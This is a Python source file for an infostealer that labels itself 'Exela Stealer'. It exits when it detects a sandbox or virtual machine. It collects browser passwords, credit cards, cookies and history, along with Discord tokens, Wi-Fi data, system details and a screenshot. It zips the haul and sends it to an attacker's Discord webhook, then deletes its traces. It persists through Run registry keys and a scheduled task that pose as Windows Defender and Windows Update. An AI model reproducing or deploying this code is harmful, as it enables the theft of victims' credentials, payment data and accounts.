import genHwid, Zip, browsers, discord, network, screenshot, wifi, systeminfo
import os, shutil, time, ctypes, sys, winreg, dhooks, wmi


serialNumber = genHwid.Gen().get_hwid_number() 
name = os.getenv("computername")

class Main:
    def __init__(self) -> None:
        self.path = os.getenv("temp")
        self.hwid = serialNumber
        self.hook = "%WEBHOOK_URL%"
        self.sb()
        self.vm()
        self.calling()
    def calling(self):
        self.createDirectory()
        self.asyncCallback()
        time.sleep(0.1)
        self.zip_file()
        time.sleep(0.1)
        self.exelaSending()
        time.sleep(0.1)
        self.delete()
    def createDirectory(self):
        if not os.path.isdir(self.path + "\\" + self.hwid + f"__{name}"):
            try:
                os.mkdir(self.path + "\\" + self.hwid + f"__{name}")
            except:
                pass
        else:
            return
    def zip_file(self):
        path = os.getenv("temp")
        file_path = os.path.join(path, f"{self.hwid}__{name}")
        Zip.zipFile(file_path)
    def exelaSending(self):
        value = browsers.count
        value1 = browsers.CCcount
        value2 = browsers.CookieCount
        value3 = browsers.DownloadsCount
        value4 = browsers.HistoryCount
        photo = "https://i.hizliresim.com/gkasf41.png"
        hook = dhooks.Webhook(self.hook, avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
        filee = dhooks.File(self.path + "\\" + self.hwid + f"__{name}.zip")
        embed = dhooks.Embed(title="***Exela Stealer***", description="***All Browser Data Stolen***", color=0xaea795)
        embed.set_thumbnail(url=photo)
        embed.add_field(name="Total Password's\n", value=f"```{str(value)}```")
        embed.add_field(name="Total Credit Card's\n", value=f"```{str(value1)}```")
        embed.add_field(name="Total Cookie's\n", value=f"```{str(value2)}```")
        embed.add_field(name="Total Download's\n", value=f"```{str(value3)}```")
        embed.add_field(name="Total History's\n", value=f"```{str(str(value4))}```")
        hook.send(embed=embed,file=filee)
    def asyncCallback(self):
        discord.Discord(self.hook)
        browsers.Chromium()
        browsers.Opera()
        wifi.Wifi()
        systeminfo.Info()
        network.Network()
        screenshot.ScreenShot()
    def delete(self):
        try:
            shutil.rmtree(self.path + "\\" + self.hwid + f"__{name}")
            os.remove(self.path + "\\" + self.hwid + f"__{name}.zip")
        except:
            pass
    def sb(self):
        try:
            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
        except:
            pass
        else:sys.exit(0)
    def vm(self):
        objWmi = wmi.WMI()
        for diskDrive in objWmi.query("Select * from Win32_DiskDrive"):
            if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
                sys.exit(0)
            else:
                pass
        
class Startup():
    def __init__(self) -> None:
        self.value = 0
        self.copyToPath()
        self.privilage()
        self.setRegistry()
    def copyToPath(self):
        try:
            shutil.copyfile(sys.argv[0], os.getenv("temp") + "\\SecurityHealh.exe") # copying to temp path
        except:
            pass
    def privilage(self):
        try:
            code = ctypes.windll.shell32.IsUserAnAdmin()
            if code==0:
                self.value = 0
            elif code == 1:
                self.value= 1 # if the output code is equal 1, we are admin, if not, we are not admin
        except:
            pass
    def setRegistry(self):
        if self.value == 0:
            try:
                softWare = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(softWare, "WindowsDefender", 0, winreg.REG_SZ, os.getenv("temp") + "\\SecurityHealh.exe")
            except:
                pass
        elif self.value == 1:
            try:
                softWare = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(softWare, "WindowsDefender", 0, winreg.REG_SZ, os.getenv("temp") + "\\SecurityHealh.exe")
            except:
                try:
                    os.system("schtasks /create /f /sc onlogon /rl highest " + "/tn " + "AutoWindowsUpdater" + " /tr " + self.path + "\\Temp\\" + "winupdate.exe")
                except:
                    pass

if __name__ == '__main__':
    Main()
    Startup()
